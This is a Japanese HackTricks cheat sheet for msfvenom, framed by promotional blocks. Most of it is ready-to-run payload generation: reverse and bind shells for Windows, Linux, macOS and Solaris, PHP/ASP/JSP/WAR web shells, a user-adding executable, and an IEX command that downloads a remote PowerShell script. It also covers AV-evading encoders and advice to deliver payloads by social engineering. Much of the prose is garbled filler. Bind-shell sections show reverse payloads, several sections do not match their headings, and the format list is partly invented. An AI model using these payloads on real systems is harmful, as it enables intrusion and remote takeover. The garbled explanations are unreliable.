# MSFVenom - チートシート

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

---

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

または、`-a`を使用してアーキテクチャを指定するか、`--platform`を使用することもできます。

## リスト
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## シェルコードを作成する際の一般的なパラメータ

When creating a shellcode, there are several common parameters that can be used to customize the payload. These parameters include:

- **LHOST**: The local IP address or hostname that the reverse shell will connect back to.
- **LPORT**: The local port number that the reverse shell will use for the connection.
- **RHOST**: The remote IP address or hostname that the bind shell will listen on.
- **RPORT**: The remote port number that the bind shell will use for the connection.
- **EXITFUNC**: The method used to exit the shellcode after execution.
- **Encoder**: The encoding method used to obfuscate the shellcode.
- **BadChars**: Any characters that should be avoided in the shellcode.
- **Payload**: The specific payload to be used, such as windows/meterpreter/reverse_tcp.

シェルコードを作成する際には、ペイロードをカスタマイズするために使用できるいくつかの一般的なパラメータがあります。これらのパラメータには以下が含まれます：

- **LHOST**：リバースシェルが接続するローカルIPアドレスまたはホスト名。
- **LPORT**：リバースシェルが接続に使用するローカルポート番号。
- **RHOST**：バインドシェルがリッスンするリモートIPアドレスまたはホスト名。
- **RPORT**：バインドシェルが接続に使用するリモートポート番号。
- **EXITFUNC**：シェルコードの実行後に使用される終了方法。
- **エンコーダ**：シェルコードを曖昧化するために使用されるエンコーディング方法。
- **BadChars**：シェルコードで回避する必要のある任意の文字。
- **ペイロード**：使用する特定のペイロード（例：windows/meterpreter/reverse_tcp）。
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
### **リバースシェル**

リバースシェルは、ターゲットのWindowsマシンに接続するための便利な方法です。以下の手順に従って、リバースシェルを作成しましょう。

1. Metasploitフレームワークを使用して、リバースシェルペイロードを生成します。次のコマンドを実行します。

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

2. 上記のコマンドを実行すると、`shell.exe`という名前の実行可能ファイルが生成されます。このファイルをターゲットマシンに送信します。

3. ターゲットマシンで`shell.exe`を実行します。これにより、ターゲットマシンが攻撃者のマシンに接続します。

4. Metasploitフレームワークを使用して、リバースシェルに接続します。次のコマンドを実行します。

```
msfconsole
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```

5. 上記のコマンドを実行すると、攻撃者のマシンがリバースシェルに接続し、ターゲットマシンを制御できるようになります。

以上で、Windowsマシンへのリバースシェルの作成が完了しました。
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using msfvenom, you can use the following command:

```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number to listen on.
- `<format>`: The output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The file to save the generated payload.

For example, to create a bind shell payload for a Windows system, listening on port 4444, and save it as an executable file named `shell.exe`, you can use the following command:

```
msfvenom -p windows/meterpreter/bind_tcp LHOST=<attacker IP> LPORT=4444 -f exe -o shell.exe
```

Remember to replace `<attacker IP>` with your actual IP address.

Once the payload is generated, you can transfer it to the target system and execute it. Once the bind shell is established, you can use a compatible listener, such as Metasploit's `multi/handler`, to connect to the target system and gain remote access.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### ユーザーの作成

To create a user, you can use the `msfvenom` tool provided by Metasploit. `msfvenom` allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

ユーザーを作成するには、Metasploitが提供する`msfvenom`ツールを使用することができます。`msfvenom`を使用すると、シェルコードを含むさまざまなタイプのペイロードを生成することができます。これを使用して、ターゲットシステム上にユーザーを作成することができます。

The following command can be used to generate a payload that creates a user with the username "hacker" and password "password123":

以下のコマンドを使用して、ユーザー名が「hacker」でパスワードが「password123」のユーザーを作成するペイロードを生成することができます。

```plaintext
msfvenom -p windows/adduser USER=hacker PASS=password123 -f exe > adduser.exe
```

This command generates an executable file named "adduser.exe" that, when executed on the target system, will create a user with the specified username and password.

このコマンドは、「adduser.exe」という名前の実行可能ファイルを生成します。このファイルは、ターゲットシステムで実行されると、指定したユーザー名とパスワードでユーザーを作成します。

You can then deliver this payload to the target system using various methods, such as social engineering or exploiting vulnerabilities.

その後、ソーシャルエンジニアリングや脆弱性の悪用など、さまざまな方法を使用して、このペイロードをターゲットシステムに送信することができます。
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMDシェル

The CMD shell is a command-line interpreter for Windows operating systems. It provides a way to interact with the operating system by executing commands and scripts. The CMD shell is commonly used by system administrators and power users for various tasks, such as managing files and directories, running programs, and configuring system settings.

#### Creating a CMD Shell Payload with msfvenom

To create a CMD shell payload using msfvenom, you can use the following command:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port number you want to use for the reverse shell connection.

This command will generate a Windows executable file named `shell.exe` that, when executed on the target system, will establish a reverse TCP connection to your machine.

#### Executing the CMD Shell Payload

To execute the CMD shell payload on the target system, you can use various methods, such as social engineering, exploiting vulnerabilities, or using a post-exploitation framework like Metasploit.

Once the payload is executed on the target system, it will establish a reverse TCP connection to your machine. You can then interact with the CMD shell on the target system through your listener.

#### Conclusion

The CMD shell is a powerful tool for interacting with Windows operating systems. By creating and executing CMD shell payloads, you can gain remote access to target systems and perform various tasks for penetration testing or other purposes.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **コマンドの実行**

The `msfvenom` tool can be used to generate payloads that can execute arbitrary commands on the target system. This can be useful for various purposes, such as gaining remote access or performing post-exploitation activities.

`msfvenom` provides the `exec` payload option, which allows you to specify a command to be executed on the target system. The generated payload can then be delivered to the target using various methods, such as email attachments, malicious downloads, or social engineering techniques.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse <options>
```

Replace `<options>` with the appropriate options for your specific scenario. For example, you can specify the IP address and port of your listener using the `LHOST` and `LPORT` options.

Once the payload is generated, you can deliver it to the target and execute the command by establishing a connection to your listener. This can be done using tools like `netcat` or `meterpreter`.

Keep in mind that executing arbitrary commands on a target system without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal authorization before performing any actions that may compromise the security of a system.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### エンコーダ

An encoder is a tool used in hacking to obfuscate or encode malicious payloads. It is commonly used to bypass security measures such as antivirus software. By encoding the payload, the hacker can make it more difficult for security systems to detect and analyze the malicious code.

エンコーダは、悪意のあるペイロードを曖昧化またはエンコードするために使用されるツールです。これは、アンチウイルスソフトウェアなどのセキュリティ対策を回避するために一般的に使用されます。ペイロードをエンコードすることで、ハッカーはセキュリティシステムが悪意のあるコードを検出および分析するのをより困難にすることができます。
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 実行可能ファイルに埋め込まれた形で

When performing a penetration test, it may be necessary to embed a payload inside an executable file. This can be done using the `msfvenom` tool, which is part of the Metasploit Framework. `msfvenom` allows you to generate various types of payloads, including shellcode, which can then be embedded into an executable file.

To embed a payload inside an executable, you can use the following command:

```
msfvenom -p <payload> -f <format> -o <output_file>
```

Here, `<payload>` refers to the type of payload you want to generate, such as a reverse shell or a meterpreter session. `<format>` specifies the format of the output file, such as exe or elf. `<output_file>` is the name of the file that will contain the embedded payload.

For example, to generate a reverse shell payload and embed it into an executable file named `exploit.exe`, you can use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o exploit.exe
```

Replace `<attacker_ip>` with the IP address of the machine running the listener, and `<attacker_port>` with the port number on which the listener is running.

Once the payload is embedded into the executable file, it can be executed on the target system to establish a connection back to the attacker's machine. This can be useful for gaining remote access or executing commands on the target system.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
The reverse shell payload is a commonly used technique in penetration testing. It allows an attacker to establish a connection from the target machine to their own machine, giving them remote access and control over the target.

To create a reverse shell payload using `msfvenom`, you can use the following command:

```bash
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: The payload to use. This can be any compatible payload, such as `linux/x86/shell_reverse_tcp`.
- `<attacker IP>`: The IP address of the attacker's machine.
- `<attacker port>`: The port on the attacker's machine to listen on.
- `<format>`: The output format for the payload. This can be `elf`, `raw`, `exe`, `psh`, `asp`, `jsp`, `war`, `pl`, `py`, `rb`, `dll`, `so`, `osx`, `macho`, `elf`, `deb`, `rpm`, `jar`, `msi`, `hta`, `vba`, `vbs`, `hta-psh`, `asp-psh`, `jsp-psh`, `war-psh`, `pl-psh`, `py-psh`, `rb-psh`, `dll-psh`, `so-psh`, `osx-psh`, `macho-psh`, `elf-psh`, `deb-psh`, `rpm-psh`, `jar-psh`, `msi-psh`, `hta-psh-net`, `asp-psh-net`, `jsp-psh-net`, `war-psh-net`, `pl-psh-net`, `py-psh-net`, `rb-psh-net`, `dll-psh-net`, `so-psh-net`, `osx-psh-net`, `macho-psh-net`, `elf-psh-net`, `deb-psh-net`, `rpm-psh-net`, `jar-psh-net`, or `msi-psh-net`.
- `<output file>`: The file to save the payload to.

For example, to create a reverse shell payload using the `linux/x86/shell_reverse_tcp` payload, with the attacker's IP address set to `192.168.0.100` and the port set to `4444`, and save it as `reverse_shell.elf`, you would use the following command:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

Once the payload is created, you can transfer it to the target machine and execute it to establish a reverse shell connection.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using msfvenom, you can use the following command:

```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number to listen on.
- `<format>`: The output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The file to save the generated payload.

For example, to create a bind shell payload for a Windows system, listening on port 4444, and save it as an executable file named `shell.exe`, you can use the following command:

```
msfvenom -p windows/meterpreter/bind_tcp LHOST=<attacker IP> LPORT=4444 -f exe -o shell.exe
```

Remember to replace `<attacker IP>` with your actual IP address.

Once the payload is generated, you can transfer it to the target system and execute it. Once the bind shell is established, you can use a compatible listener, such as Metasploit's `multi/handler`, to connect to the target system and gain remote access.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS（Solaris）

SunOS（Solaris）は、Sun Microsystemsによって開発された商用UNIXオペレーティングシステムです。SunOSは、高い信頼性とスケーラビリティを備えたシステムであり、特に企業環境で広く使用されています。

### Metasploit Frameworkとmsfvenom

Metasploit Frameworkは、セキュリティテストやペネトレーションテストに使用されるオープンソースのフレームワークです。msfvenomは、Metasploit Frameworkの一部であり、ペイロードの生成とエクスプロイトの作成に使用されます。

### msfvenomの概要

msfvenomは、Metasploit Frameworkのコマンドラインツールであり、様々なプラットフォームで動作するペイロードを生成するために使用されます。ペイロードは、悪意のあるコードやコマンドを含むバイナリファイルです。

msfvenomを使用すると、様々なエクスプロイトシナリオに対応したペイロードを生成することができます。また、生成されたペイロードは、特定のプラットフォームやアーキテクチャに最適化されています。

### msfvenomの使用方法

msfvenomコマンドを使用するには、以下のような構文を使用します。

```
msfvenom -p <payload> [options]
```

ここで、`<payload>`は生成するペイロードの種類を指定します。オプションは、生成するペイロードの設定やパラメータを指定するために使用されます。

msfvenomは、様々なプラットフォームやアーキテクチャに対応しており、生成するペイロードの種類も豊富です。また、生成されたペイロードは、実行可能なファイルやスクリプト、バイナリデータなどの形式で保存することができます。

### msfvenomの例

以下は、msfvenomを使用してWindowsプラットフォーム向けのペイロードを生成する例です。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > payload.exe
```

この例では、`windows/meterpreter/reverse_tcp`というペイロードを生成しています。`LHOST`と`LPORT`は、攻撃者のIPアドレスとポート番号を指定するためのオプションです。生成されたペイロードは、`payload.exe`という名前の実行可能ファイルとして保存されます。

### msfvenomの応用

msfvenomは、ペネトレーションテストやセキュリティテストにおいて、エクスプロイトの作成や脆弱性の検証に使用されます。生成されたペイロードは、悪意のある攻撃者がターゲットシステムに侵入するために使用されることがあります。

msfvenomを使用する際には、法的な制約や倫理的な観点を考慮し、適切な許可を得ることが重要です。また、自身のシステムやネットワークに対してテストを行う場合には、十分な注意と専門知識が必要です。
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
### **リバースシェル:**

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. In Metasploit, you can generate a reverse shell payload using the `msfvenom` tool.

リバースシェルは、ターゲットマシンが攻撃者のマシンに接続を開始するタイプのシェルです。これにより、攻撃者はターゲットマシンにリモートアクセスしてコマンドを実行することができます。Metasploitでは、`msfvenom`ツールを使用してリバースシェルペイロードを生成することができます。

To generate a reverse shell payload for macOS, you can use the following command:

macOS用のリバースシェルペイロードを生成するには、次のコマンドを使用します:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f <output format> > <output file>
```

Replace `<attacker IP>` with the IP address of your machine and `<attacker port>` with the port number you want to use for the connection. `<output format>` can be any supported format, such as `elf`, `macho`, or `app`. `<output file>` is the name of the file where the payload will be saved.

`<attacker IP>`を自分のマシンのIPアドレスに、`<attacker port>`を接続に使用するポート番号に置き換えてください。`<output format>`は、`elf`、`macho`、`app`などのサポートされている形式であることができます。`<output file>`は、ペイロードが保存されるファイルの名前です。

Once the payload is generated, you can transfer it to the target machine and execute it to establish a reverse shell connection.

ペイロードが生成されたら、それをターゲットマシンに転送し、リバースシェル接続を確立するために実行することができます。
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
バインドシェルは、攻撃者がターゲットマシンに接続するためのシェルを作成する方法です。バインドシェルを使用すると、攻撃者はターゲットマシンに対してリモートでコマンドを実行できます。バインドシェルは、攻撃者がターゲットマシンにアクセスするためのバックドアとして機能します。

バインドシェルを作成するために、`msfvenom`コマンドを使用します。以下のコマンドは、バインドシェルを作成するための基本的な構文です。

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker IP>`: 攻撃者のIPアドレスを指定します。
- `<attacker port>`: 攻撃者が接続するポート番号を指定します。
- `<format>`: 出力ファイルの形式を指定します。
- `<output file>`: 出力ファイルのパスと名前を指定します。

例えば、以下のコマンドは、Linuxシステム上で動作するバインドシェルを作成します。

```plaintext
msfvenom -p linux/x86/shell_bind_tcp LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

このコマンドを実行すると、指定した形式とファイル名でバインドシェルが作成されます。このバインドシェルをターゲットマシンにデプロイし、攻撃者は指定したIPアドレスとポート番号を使用して接続することができます。
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Webベースのペイロード**

### **PHP**

#### 逆シェル
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
The ASP/x reverse shell is a payload that allows an attacker to gain remote access to a target system running ASP or ASP.NET. This payload can be generated using the `msfvenom` tool, which is part of the Metasploit Framework.

To generate an ASP/x reverse shell payload, you can use the following `msfvenom` command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f asp > shell.asp
```

Replace `<attacker IP>` with the IP address of your machine and `<attacker port>` with the port number you want to use for the reverse shell connection.

Once the payload is generated, you can upload the `shell.asp` file to the target system and execute it. This will establish a reverse TCP connection between the target system and your machine, giving you remote access to the target.

Note: Make sure to set up a listener on your machine to catch the incoming reverse shell connection. You can use the `multi/handler` module in Metasploit for this purpose.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
#### リバースシェル

リバースシェルは、ターゲットシステムに対してリモートでアクセスするための便利な方法です。JSP（Java Server Pages）を使用してリバースシェルを作成することができます。

以下のコマンドを使用して、msfvenomを介してJSPリバースシェルを生成します。

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

このコマンドでは、`<attacker IP>`と`<attacker port>`を攻撃者のIPアドレスとポート番号に置き換える必要があります。

生成された`shell.war`ファイルをターゲットシステムにアップロードし、デプロイします。その後、Webブラウザを使用して`http://<target IP>/shell/`にアクセスします。

これにより、攻撃者はターゲットシステムに対してリモートシェルを確立することができます。
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
The **WAR** file format is commonly used in Java web applications. It stands for Web Application Archive and is essentially a compressed file that contains all the necessary files and resources for a web application to run.

A **reverse shell** is a type of shell that allows an attacker to establish a connection to a target machine from a remote location. This is useful for gaining unauthorized access to a system and executing commands on it.

To create a **reverse shell** payload in a **WAR** file using **msfvenom**, you can use the following command:

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
```

Replace `<attacker IP>` with the IP address of the machine where the attacker is running the listener, and `<attacker port>` with the port number on which the listener is running.

This command will generate a **WAR** file named `shell.war` that contains the reverse shell payload. Once the target machine executes this file, it will establish a connection back to the attacker's machine, allowing the attacker to interact with the target system through a shell.

Remember to use this technique responsibly and only on systems that you have proper authorization to test.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJSは、JavaScriptランタイム環境であり、サーバーサイドでのアプリケーション開発に使用されます。NodeJSは、非同期イベント駆動型のアーキテクチャを持ち、高いパフォーマンスとスケーラビリティを提供します。

NodeJSを使用して開発されたアプリケーションは、一般的にシングルスレッドで動作しますが、非同期処理により複数のタスクを同時に処理することができます。これにより、高い並行性と効率性が実現されます。

NodeJSは、豊富なパッケージエコシステムを持っており、npm（Node Package Manager）を使用してパッケージのインストールや管理が容易に行えます。また、NodeJSは、Webサーバーの構築やAPIの作成にも適しています。

NodeJSは、セキュリティの観点からも注意が必要です。適切なセキュリティ対策を講じない場合、悪意のあるユーザーによる攻撃のリスクがあります。セキュリティの脆弱性を悪用する攻撃手法も存在しますので、常に最新のセキュリティパッチを適用し、セキュリティテストを実施することが重要です。

NodeJSは、柔軟性とパフォーマンスの両方を備えた強力な開発ツールであり、Webアプリケーションの開発において広く利用されています。
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **スクリプト言語のペイロード**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Pythonは、人気のあるプログラミング言語であり、多くのハッカーにとって重要なツールです。Pythonは、シンプルで読みやすい構文を持ち、幅広い用途に使用することができます。Pythonを使用すると、効率的なスクリプトやツールを作成することができます。

Pythonは、ハッキングにおいてさまざまな目的に使用されます。例えば、情報収集、脆弱性スキャン、エクスプロイト開発、ペネトレーションテストなどです。Pythonの柔軟性と豊富なライブラリのおかげで、これらのタスクを効果的に実行することができます。

Pythonを使用してハッキングに取り組む場合、以下のような一般的な手法とリソースを活用することができます。

#### **msfvenom**

msfvenomは、Metasploit Frameworkの一部であり、ペイロードを生成するために使用されます。ペイロードは、攻撃者がターゲットシステムに送信するコードまたはデータのことです。msfvenomを使用すると、さまざまなプラットフォームやアーキテクチャに対応したカスタムペイロードを作成することができます。

msfvenomは、コマンドラインツールとして提供されており、様々なオプションを使用してペイロードをカスタマイズすることができます。例えば、エンコーディング、出力形式、バイナリファイルの生成などです。

以下は、msfvenomを使用してWindowsシステム向けのリバースシェルペイロードを生成する例です。

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

このコマンドは、Windowsシステムに対してリバースシェル接続を確立するためのペイロードを生成し、`shell.exe`という名前のバイナリファイルに保存します。

msfvenomは、ハッキングにおいて非常に便利なツールであり、さまざまな攻撃シナリオで使用されます。ただし、悪意のある目的で使用する場合は、法的な制約と倫理的な考慮事項に留意する必要があります。
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash（Bourne Again SHell）は、Unixシェルとして広く使用されているコマンド言語です。Bashは、LinuxやmacOSなどの多くのオペレーティングシステムでデフォルトのシェルとして提供されています。Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。

Bashは、コマンドラインインターフェース（CLI）を介して操作されます。ユーザーは、ターミナルウィンドウでコマンドを入力し、Bashがそれを解釈して実行します。Bashは、シェルスクリプトとしても使用でき、複数のコマンドをまとめて実行することができます。

Bashは、パイプやリダイレクトなどの機能を提供し、コマンドの出力を他のコマンドに渡すことができます。また、変数や制御構造（ループや条件分岐）を使用して、より複雑なスクリプトを作成することもできます。

Bashは、システム管理や自動化、セキュリティテストなど、さまざまな目的で使用されます。Bashの強力な機能と柔軟性は、ハッカーにとっても非常に有用です。
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後にのみ開始されます。バグが検証された後に報奨金を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長する日々において、Web3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたり**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
